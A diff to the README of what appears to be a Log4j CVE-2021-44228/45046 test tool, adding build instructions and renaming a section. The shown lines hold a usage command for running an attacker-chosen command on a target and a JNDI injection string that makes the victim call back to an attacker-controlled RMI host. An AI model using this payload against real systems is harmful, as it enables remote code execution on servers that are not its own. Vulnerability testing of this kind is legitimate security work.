@@ -5,14 +5,18 @@ This project will help to test the Log4j CVE-2021-44228/CVE-2021-45046 vulnerabi
 ## Installation and Building
 
 - Load the project on Intellij Idea
+- Select JDK in "Projects Settings"
+- Create the artifact in "Project Settings" -> Artifacts -> Create JAR from Modules -> In "JAR files from libraries" mark "extract to target JAR"
 - Build Project (CTRL + F9). This will create the jar file in /out/artifacts/ folder
 
 ### Building with Maven
 
+Requires Java 1.8+ and Maven 3.x+
+
 - `mvn clean package -DskipTests`
 - You will find the .jar file in /target folder
 
-## Examples 
+## Usages 
 
 ### 1.RMI Attack Vector
 
@@ -39,3 +43,7 @@ You must indicate the command you want to run in the target.
 `java -jar Log4j-JNDIServer.jar 3 <RMI_IP> <RMI_PORT> <COMMAND>`
 
 `Injection: {jndi:rmi://<RMI_IP>:<RMI_PORT>/Foo}`
+
+## Examples
+
+
